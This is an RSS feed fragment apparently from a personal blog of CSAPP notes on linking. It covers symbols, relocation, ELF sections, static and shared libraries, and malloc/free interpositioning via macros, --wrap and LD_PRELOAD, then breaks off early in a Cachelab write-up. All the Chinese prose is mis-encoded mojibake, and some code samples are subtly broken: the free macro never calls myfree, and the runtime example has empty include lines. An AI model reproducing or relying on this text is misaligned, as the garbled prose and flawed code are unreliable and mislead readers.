  æ¨¡å—ä¸­èƒ½å¤Ÿè¢«å…¶ä»–æ¨¡å—ä½¿ç”¨çš„ç¬¦å·,å¦‚éstaticçš„å‡½æ•°å’Œå…¨å±€å˜é‡&lt;/li&gt;
&lt;li&gt;å¤–éƒ¨ç¬¦å·
  ç”±å…¶ä»–æ¨¡å—å®šä¹‰çš„å…¨å±€ç¬¦å·&lt;/li&gt;
&lt;li&gt;å±€éƒ¨ç¬¦å·
  åœ¨æ¨¡å—ä¸­å®šä¹‰ä¸”åªèƒ½åœ¨è¯¥æ¨¡å—ä¸­ä½¿ç”¨çš„ç¬¦å·,å¦‚staticå‡½æ•°å’Œå˜é‡&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å±€éƒ¨éé™æ€å˜é‡å­˜å‚¨åœ¨å †æ ˆä¸Š&lt;/li&gt;
&lt;li&gt;å±€éƒ¨é™æ€å˜é‡å­˜å‚¨åœ¨.dataæˆ–.bssä¸­&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int f(){
    static int x=2;
    return x;
}
int g(){
    static int x=1;
    return x;
}
int h(){
    int x=5;
    return x;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  è™½ç„¶ &lt;code&gt;f()&lt;/code&gt;å’Œ &lt;code&gt;g()&lt;/code&gt;å‡½æ•°çš„é™æ€å˜é‡éƒ½å«x,ä½†ç¼–è¯‘å™¨ç”¨åˆ«å(x.1,x.2)ä¼šåŠ ä»¥åŒºåˆ†.
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¼ºç¬¦å·å’Œå¼±ç¬¦å·&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¼ºç¬¦å·:å‡½æ•°å®šä¹‰å’Œå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;/li&gt;
&lt;li&gt;å¼±ç¬¦å·:æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¦å·è§„åˆ™&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä¸å…è®¸å¤šä¸ªåŒåçš„å¼ºç¬¦å·&lt;/li&gt;
&lt;li&gt;åŒåçš„ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·,é€‰æ‹©å¼ºç¬¦å·
 å¼•ç”¨å¼±ç¬¦å·å°†è¢«è§£æåˆ°å¼ºç¬¦å·çš„å®šä¹‰å¤„&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int x=5;
int y=7;
void p1(){}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;double x;
void p2(){}
&lt;/code&gt;&lt;/pre&gt;
 åœ¨p2ä¸­ä½¿ç”¨x,ä¼šæ”¹å˜yçš„å€¼!&lt;/li&gt;
&lt;li&gt;å¤šä¸ªåŒåçš„å¼±ç¬¦å·,ä»»æ„é€‰æ‹©ä¸€ä¸ª
 ä½¿ç”¨&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -fno-common
&lt;/code&gt;&lt;/pre&gt;
 æœç»è¿™ç§è¡Œä¸º.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å»ºè®®&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å‡å°‘ä½¿ç”¨å…¨å±€å˜é‡&lt;/li&gt;
&lt;li&gt;å®šä¹‰æ—¶åˆå§‹åŒ–&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ &lt;code&gt;static&lt;/code&gt;å’Œ &lt;code&gt;extern&lt;/code&gt;åŠ ä»¥é™åˆ¶&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;é‡å®šå‘(Relocation)
æŠŠåˆ†ç¦»çš„ä»£ç å’Œæ•°æ®åˆå¹¶åœ¨å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªæ¿å—å†….
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201141301.png&quot; alt=&quot;&quot;&gt;
åœ¨é‡å®šå‘å‰,ç¼–è¯‘å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶çš„å‡½æ•°å’Œæ•°æ®çš„åœ°å€åªæ˜¯å®ƒåœ¨æ¨¡å—ä¸­çš„åç§»é‡,é“¾æ¥å™¨å†³å®šå½“ç¨‹åºæ‰§è¡Œæ—¶å®ƒä»¬å­˜å‚¨åœ¨å“ªé‡Œ,å°†åœ°å€å’Œç¬¦å·ç»‘å®šèµ·æ¥.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201141713.png&quot; alt=&quot;&quot;&gt;
===========================&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201141819.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;ä¸‰ç±»ç›®æ ‡æ–‡ä»¶&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶( *.o)
æ±‡ç¼–å™¨çš„è¾“å‡º;å¯ä»¥å’Œå…¶ä»–.oæ–‡ä»¶ç”±è¿æ¥å™¨åˆå¹¶ä¸ºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶(a.out)
è¿æ¥å™¨è¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å…±äº«ç›®æ ‡æ–‡ä»¶(*.so)
åŠ¨æ€é“¾æ¥åº“(dll),è¿è¡Œæ—¶åŠ è½½.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;å¯æ‰§è¡Œå¯é“¾æ¥æ ¼å¼(ELF)&lt;/h1&gt;
&lt;p&gt;ä»¥ä¸Šä¸‰ç§ç›®æ ‡æ–‡ä»¶çš„æ ‡å‡†ç»Ÿä¸€æ ¼å¼
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201113741.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ELF header
å®šä¹‰äº†å­—é•¿,å­—èŠ‚åº,æ–‡ä»¶ç±»å‹,æœºå™¨ç±»å‹&lt;/li&gt;
&lt;li&gt;æ®µå¤´éƒ¨è¡¨&lt;/li&gt;
&lt;li&gt;.text
ä»£ç &lt;/li&gt;
&lt;li&gt;.rodata 
åªè¯»æ•°æ®,å¦‚è·³è½¬è¡¨&lt;/li&gt;
&lt;li&gt;.data
æœ‰åˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;/li&gt;
&lt;li&gt;.bss 
æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡&lt;/li&gt;
&lt;li&gt;.symtab
åŒ…å«ç¨‹åºå…¨å±€å˜é‡çš„ç»“æ„ä½“æ•°ç»„;stacticå˜é‡&lt;/li&gt;
&lt;li&gt;.rel.text
éœ€è¦åœ¨å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­é‡å®šä½çš„æŒ‡ä»¤&lt;/li&gt;
&lt;li&gt;.rel.data
éœ€è¦åœ¨å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­é‡å®šä½çš„æ•°æ®&lt;/li&gt;
&lt;li&gt;.debug
&lt;code&gt;gcc -g&lt;/code&gt;
åŒ…å«äº†æºä»£ç çš„è¡Œå·ä¸æœºå™¨ä»£ç çš„è¡Œå·ç›¸å…³è”çš„ä¿¡æ¯&lt;/li&gt;
&lt;li&gt;èŠ‚å¤´éƒ¨è¡¨
æ¯ä¸ªsectionçš„åç§»é‡å’Œå¤§å°.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;åŠ è½½å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201142208.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;åº“:æ‰“åŒ…å¸¸ç”¨å‡½æ•°&lt;/h1&gt;
&lt;p&gt;é€šè¿‡é™æ€é“¾æ¥å¸¸ç”¨å‡½æ•°çš„æºæ–‡ä»¶,æœ‰ä¸¤ç§å®ç°æ–¹å¼:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å°†æ‰€æœ‰å¸¸ç”¨å‡½æ•°å†™åœ¨ä¸€ä¸ªæºæ–‡ä»¶ä¸­,è¿™ä¼šå¯¼è‡´ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶å†—ä½™&lt;/li&gt;
&lt;li&gt;å°†æ¯ä¸ªå‡½æ•°å†™åœ¨å•ç‹¬çš„æºæ–‡ä»¶ä¸­,è¿™ä¼šå¯¼è‡´é“¾æ¥å‘½ä»¤éå¸¸é•¿
ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜,å¼•å…¥äº†é“¾æ¥åº“çš„æŠ€æœ¯.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;é™æ€é“¾æ¥åº“(.aæ–‡ä»¶)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;åŸç†&lt;ul&gt;
&lt;li&gt;é“¾æ¥å¤šä¸ª.oæ–‡ä»¶æˆä¸€ä¸ªæ–‡æ¡£&lt;/li&gt;
&lt;li&gt;å½“è¿æ¥å™¨é‡åˆ°æœªè§£æçš„å¤–éƒ¨å¼•ç”¨æ—¶,å»æ–‡æ¡£ä¸­å¯»æ‰¾è¯¥ç¬¦å·&lt;/li&gt;
&lt;li&gt;å¦‚æœèƒ½æ‰¾åˆ°,å°†å…¶é“¾æ¥è¿›å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;åˆ›å»ºé™æ€åº“
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201144113.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨é™æ€åº“&lt;ul&gt;
&lt;li&gt;é“¾æ¥å™¨è§£æå¤–éƒ¨å¼•ç”¨çš„ç®—æ³•:&lt;ul&gt;
&lt;li&gt;æŒ‰ç…§å‘½ä»¤è¡Œé¡ºåºæ‰«æ.oå’Œ.aæ–‡ä»¶&lt;/li&gt;
&lt;li&gt;æ‰«æè¿‡ç¨‹ä¸­,ç»´æŠ¤ä¸€ä¸ªæœªè§£æå¼•ç”¨åˆ—è¡¨&lt;/li&gt;
&lt;li&gt;æ¯æ¬¡é‡åˆ°ä¸€ä¸ªæ–°çš„.oæˆ–.aæ–‡ä»¶,å°è¯•åœ¨å…¶ä¸­è§£ææœªè§£æå¼•ç”¨&lt;/li&gt;
&lt;li&gt;å¦‚æœåˆ°äº†æœ«å°¾è¿˜æœ‰æœªè§£æå¼•ç”¨,å°±æŠ¥linker error
  æ‰€ä»¥,å‘½ä»¤è¡Œå‚æ•°çš„é¡ºåºå°±ååˆ†é‡è¦:&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -L . libtest.o -lmine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  æ˜¯æ­£ç¡®çš„å†™æ³•,è€Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -L . -lmine libtest.o
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  ä¼šå‘ç”Ÿ &lt;code&gt;undefined reference&lt;/code&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-L [dir]&lt;/code&gt; æŒ‡å®šæ‰€ç”¨åˆ°åº“æ–‡ä»¶æ‰€åœ¨ç›®å½•&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åŠ¨æ€é“¾æ¥åº“/å…±äº«åº“(.soæ–‡ä»¶)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;é™æ€åº“çš„ç¼ºç‚¹:&lt;ul&gt;
&lt;li&gt;å¯æ‰§è¡Œæ–‡ä»¶ä¸­å†—ä½™å­˜å‚¨åº“å‡½æ•°&lt;/li&gt;
&lt;li&gt;è¿è¡Œæ—¶å†…å­˜å†—ä½™å­˜å‚¨åº“å‡½æ•°&lt;/li&gt;
&lt;li&gt;åº“å‘ç”Ÿæ›´æ”¹,ç¨‹åºéœ€è¦é‡æ–°é“¾æ¥&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å…±äº«åº“:ç›®æ ‡æ–‡ä»¶åŒ…å«åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ è½½çš„ä»£ç å’Œæ•°æ®.&lt;/li&gt;
&lt;li&gt;åŠ¨æ€é“¾æ¥å‘ç”Ÿåœ¨å¯æ‰§è¡Œæ–‡ä»¶ç¬¬ä¸€æ¬¡åŠ è½½æˆ–è¿è¡Œæ—¶&lt;/li&gt;
&lt;li&gt;ä¹Ÿå¯ä»¥å‘ç”Ÿåœ¨å¼€å§‹è¿è¡Œå(&lt;code&gt;dlopen()&lt;/code&gt;å‡½æ•°)
  åˆ†å¸ƒå¼è½¯ä»¶/é«˜æ€§èƒ½webæœåŠ¡å™¨/åº“æ‰“æ¡©&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;dlfcn.h&amp;gt;

int x[2] = {1, 2}; 
int y[2] = {3, 4}; 
int z[2]; 
int main() { 
    void *handle; 
    void (*addvec)(int *, int *, int *, int); 
    char *error; 
    
    /* Dynamically load the shared library that contains addvec() */ 
    handle = dlopen(&amp;quot;./libvector.so&amp;quot;, RTLD_LAZY); 
    if (!handle) { 
        fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror()); 
        exit(1); 
    }
    
    /* Get a pointer to the addvec() function we just loaded */ 
    addvec = dlsym(handle, &amp;quot;addvec&amp;quot;); 
    if ((error = dlerror()) != NULL) { 
        fprintf(stderr, &amp;quot;%s\n&amp;quot;, error); 
        exit(1); 
    } 
    
    /* Now we can call addvec() just like any other function */ 
    addvec(x, y, z, 2); 
    printf(&amp;quot;z = [%d %d]\n&amp;quot;, z[0], z[1]);
     
    /* Unload the shared library */ 
    if (dlclose(handle) &amp;lt; 0) { 
        fprintf(stderr, &amp;quot;%s\n&amp;quot;, dlerror()); 
        exit(1); 
    } 
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;å…±äº«åº“å¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹å…±åŒä½¿ç”¨
åŠ è½½æ—¶çš„åŠ¨æ€é“¾æ¥:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201160053.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;åº“æ‰“æ¡©æŠ€æœ¯&lt;/h1&gt;
&lt;p&gt;æˆªè·å¯¹åº“å‡½æ•°çš„è°ƒç”¨,å–è€Œä»£ä¹‹æ‰§è¡Œè‡ªå·±çš„ä»£ç .ä½¿ç”¨åº“æ‰“æ¡©æŠ€æœ¯,å¯ä»¥è¿½è¸ªå¯¹æŸä¸ªåº“å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°,è¾“å…¥å’Œè¾“å‡ºå€¼,ç”šè‡³æ›¿æ¢ä¸ºä¸åŒçš„å‡½æ•°å®ç°.&lt;/p&gt;
&lt;h2&gt;åº”ç”¨ä¸¾ä¾‹&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* int.c */
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;malloc.h&amp;gt;
int main() { 
	int *p = malloc(32); 
	free(p); 
	return(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘å¸Œæœ›ä½¿ç”¨åº“æ‰“æ¡©æŠ€æœ¯,åœ¨ä¸ä¿®æ”¹æºä»£ç çš„å‰æä¸‹,è¿½è¸ªåˆ†é…çš„åœ°å€å’Œå¤§å°ä¿¡æ¯.
æœ‰ä¸‰ç§å®ç°æ–¹å¼,åˆ†åˆ«åœ¨ç¼–è¯‘æ—¶,é“¾æ¥æ—¶å’Œè¿è¡Œæ—¶.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ç¼–è¯‘æ—¶
  ç¼–å†™ &lt;code&gt;mymalloc.c&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef COMPILETIME
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;malloc.h&amp;gt;

/* malloc wrapper func */
void *mymalloc(size_t size){
    void *ptr = malloc(size);
    ... // è¿½è¸ªæŒ‡é’ˆä¿¡æ¯
    return ptr;    
}

/* free wrapper func */
void myfree(void *ptr){
    free(ptr);
    ... // è¿½è¸ªæŒ‡é’ˆä¿¡æ¯
}
#endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  ç¼–å†™å¤´æ–‡ä»¶ &lt;code&gt;malloc.h&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define malloc(size) mymalloc(size)
#define free(size) free(size)

void *mymalloc(size_t size);
void myfree(void *ptr);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  GCCæ„å»º:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ make
gcc -Wall -DCOMPILETIME -c mymalloc.c 
gcc -Wall -I. -o intc int.c mymalloc.o

$ ./intc
...è¾“å‡ºåœ°å€å’Œå¤§å°ä¿¡æ¯
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-I [dir]&lt;/code&gt; å‚æ•°æ·»åŠ å¤´æ–‡ä»¶çš„è·¯å¾„
&lt;code&gt;-D[define]&lt;/code&gt; å‚æ•°é¢„å®šä¹‰å®&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;é“¾æ¥æ—¶
  ç¼–å†™ &lt;code&gt;mymalloc.c&lt;/code&gt;æ–‡ä»¶:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef LINKTIME 
#include &amp;lt;stdio.h&amp;gt;
void *__real_malloc(size_t size); 
void __real_free(void *ptr); 

/* malloc wrapper function */ 
void *__wrap_malloc(size_t size) { 
    void *ptr = __real_malloc(size); /* Call libc malloc */ 
    printf(&amp;quot;malloc(%d) = %p\n&amp;quot;, (int)size, ptr); 
    return ptr; 
} 

/* free wrapper function */ 
void __wrap_free(void *ptr) { 
    __real_free(ptr); /* Call libc free */ 
    printf(&amp;quot;free(%p)\n&amp;quot;, ptr); 
} 
#endif    
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  gccæ„å»º:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;linux&amp;gt; make intl 
gcc -Wall -DLINKTIME -c mymalloc.c 
gcc -Wall -c int.c 
gcc -Wall -Wl,--wrap,malloc -Wl,--wrap,free -o intl 
int.o mymalloc.o 
linux&amp;gt; make runl 
./intl 
malloc(32) = 0x1aa0010 
free(0x1aa0010)
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;-Wl&lt;/code&gt;å°†åé¢çš„é€—å·æ›¿æ¢ä¸ºç©ºæ ¼
ä½¿ç”¨ &lt;code&gt;--wrap=symbol&lt;/code&gt;,&lt;code&gt;symbol&lt;/code&gt;ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°æ—¶,å¯¹&lt;code&gt;symbol&lt;/code&gt;çš„å¼•ç”¨ä¼šè§£æä¸º&lt;code&gt;__wrap_symbol&lt;/code&gt;å‡½æ•°.
å¦å¤–è¿˜æœ‰ä¸€ä¸ª&lt;code&gt;__real_symbol&lt;/code&gt;å‡½æ•°,åªå£°æ˜ä¸å®šä¹‰æ—¶,å¯¹å…¶è°ƒç”¨ä¼šè§£æåˆ°çœŸæ­£çš„&lt;code&gt;symbol&lt;/code&gt;å‡½æ•°.
å³:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;malloc&lt;/code&gt; -&amp;gt; &lt;code&gt;__wrap_malloc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__real_malloc&lt;/code&gt; -&amp;gt; &lt;code&gt;malloc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¿è¡Œæ—¶
  ç¼–å†™&lt;code&gt;mymalloc.c&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#ifdef RUNTIME 
#define _GNU_SOURCE 
#include 
#include 
#include 

/* malloc wrapper function */ 
void *malloc(size_t size) { 
    void *(*mallocp)(size_t size); 
    char *error; 
    mallocp = dlsym(RTLD_NEXT, &amp;quot;malloc&amp;quot;); /* Get addr of libc malloc */ 
    if ((error = dlerror()) != NULL) { fputs(error, stderr); exit(1); } 
    char *ptr = mallocp(size); /* Call libc malloc */ 
    printf(&amp;quot;malloc(%d) = %p\n&amp;quot;, (int)size, ptr); 
    return ptr; 
}

/* free wrapper function */
 void free(void *ptr) { 
     void (*freep)(void *) = NULL; 
     char *error; 
     if (!ptr) return; 
     freep = dlsym(RTLD_NEXT, &amp;quot;free&amp;quot;); /* Get address of libc free */ 
     if ((error = dlerror()) != NULL) { fputs(error, stderr); exit(1); } 
     freep(ptr); /* Call libc free */ 
     printf(&amp;quot;free(%p)\n&amp;quot;, ptr); 
 } 
 #endif
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;  gccæ„å»º:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;linux&amp;gt; make intr 
gcc -Wall -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl 
gcc -Wall -o intr int.c 
linux&amp;gt; make runr 
(LD_PRELOAD=&amp;quot;./mymalloc.so&amp;quot; ./intr) 
malloc(32) = 0xe60010 
free(0xe60010) 
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;LD_PRELOAD&lt;/code&gt;ç¯å¢ƒå˜é‡å‘Šè¯‰åŠ¨æ€è¿æ¥å™¨ä¼˜å…ˆåœ¨&lt;code&gt;mymalloc.so&lt;/code&gt;ä¸­å¯»æ‰¾æœªè§£æå¼•ç”¨.
&lt;code&gt;dlsym(RTLD_NEXT, &amp;quot;malloc&amp;quot;)&lt;/code&gt;è®©åŠ¨æ€é“¾æ¥å™¨å¯»æ‰¾ä¸‹ä¸€ä¸ª&lt;code&gt;malloc&lt;/code&gt;å‡½æ•°æŒ‡é’ˆ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Fri, 31 Jan 2025 00:00:00 GMT</pubDate></item><item><title>Cachelab</title><link>https://www.tankimzeg.top/blog/cachelab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/cachelab/</guid><description>Cachelab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/cachelab/&quot;&gt;https://www.tankimzeg.top/blog/cachelab/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;è¯´å®è¯,åˆæ¬¡æŸ¥çœ‹è¿™ä¸ªå®éªŒ,æˆ‘æ„Ÿåˆ°éå¸¸å›°æƒ‘,ä¸çŸ¥é“è¦åšä»€ä¹ˆ.Writeupä¹Ÿåªæ˜¯ä»‹ç»äº†æµ‹è¯•æ–¹æ³•,æˆ‘æ ¹æœ¬ä¸çŸ¥é“è¦å†™ä»€ä¹ˆ!æ„Ÿè§‰æ²¡æœ‰è¯´æ¸…æ¥šå•Š...&lt;/p&gt;
&lt;p&gt;åªå¥½å‚è€ƒäº†åˆ«äººçš„è§£ç­”,æ‰æ˜ç™½è¦å†™ä»€ä¹ˆä»£ç .&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/m0_65591847/article/details/132323877&quot;&gt;csappå®éªŒ5-cachelabå®éªŒè¯¦è§£&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/456858668&quot;&gt;CSAPP: Cachelabå…¨æ³¨é‡Š+æ€è·¯å’Œå»ºè®®&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Part A:ç¼–å†™ç¼“å­˜æ¨¡æ‹Ÿå™¨&lt;/h1&gt;
&lt;p&gt;æˆ‘å¹¶ä¸éœ€è¦çœŸæ­£å»å†…å­˜è¯»å–ä»€ä¹ˆæ•°æ®,åªæ˜¯æ¨¡æ‹Ÿç¼“å­˜çš„è¡Œä¸º.&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°traces/æ–‡ä»¶å¤¹ä¸‹çš„.traceæ–‡ä»¶:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250130213310.png&quot; alt=&quot;&quot;&gt;
æ ¹æ®writeupçš„è¯´æ˜,æ¯ä¸€è¡Œçš„æ ¼å¼æ˜¯:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[space]operation address,size
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;operation&lt;/th&gt;
&lt;th&gt;è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;I&lt;/td&gt;
&lt;td&gt;åŠ è½½æŒ‡ä»¤(å‰é¢æ²¡æœ‰ç©ºæ ¼)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;L&lt;/td&gt;
&lt;td&gt;åŠ è½½æ•°æ®&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;S&lt;/td&gt;
&lt;td&gt;å­˜å‚¨æ•°æ®&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;M&lt;/td&gt;
&lt;td&gt;ä¿®æ”¹æ•°æ®&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;è¿™å°±æ˜¯æ¨¡æ‹ŸCPUç»™ç¼“å­˜çš„æŒ‡ä»¤å§&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;csim.cæ–‡ä»¶çš„è¦æ±‚:&lt;/p&gt;
&lt;p&gt;ä»¥ &lt;code&gt;printSummary(hit_count, miss_count, eviction_count);&lt;/code&gt;ç»“å°¾æ¥è¿”å›ç¼“å­˜æ¨¡æ‹Ÿå™¨çš„ä½¿ç”¨æƒ…å†µ,æœ€åè¦è¾¾åˆ°ä¸&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./csim-ref [-hv] -s &amp;lt;s&amp;gt; -E &amp;lt;E&amp;gt; -b &amp;lt;b&amp;gt; -t &amp;lt;tracefile&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¾“å‡ºçš„ç»“æœä¸€è‡´.&lt;/p&gt;
&lt;p&gt;æˆ‘å›é¡¾é«˜é€Ÿç¼“å­˜çš„çŸ¥è¯†: &lt;a href=&quot;https://tankimzeg.top/blog/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98&quot;&gt;ç¼“å­˜ç»„ç»‡æ–¹å¼&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯çŸ¥(s,E,b)æ­£æ˜¯ç¼“å­˜çš„åŸºæœ¬å‚æ•°&lt;/p&gt;
&lt;p&gt;æˆ‘çš„å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦æ¥æ”¶å‘½ä»¤è¡Œå‚æ•°,Writeupæ¨èæˆ‘ä½¿ç”¨ &lt;code&gt;getopt&lt;/code&gt;åº“å‡½æ•°.&lt;/p&gt;
&lt;p&gt;æ›¿æ¢ç­–ç•¥æ˜¯ä»€ä¹ˆ?WriteupæŒ‡æ˜é‡‡ç”¨LRUç­–ç•¥(least-recently used),æ›¿æ¢æœ€è¿‘æ²¡æœ‰è¢«è®¿é—®çš„è¡Œ.&lt;/p&gt;
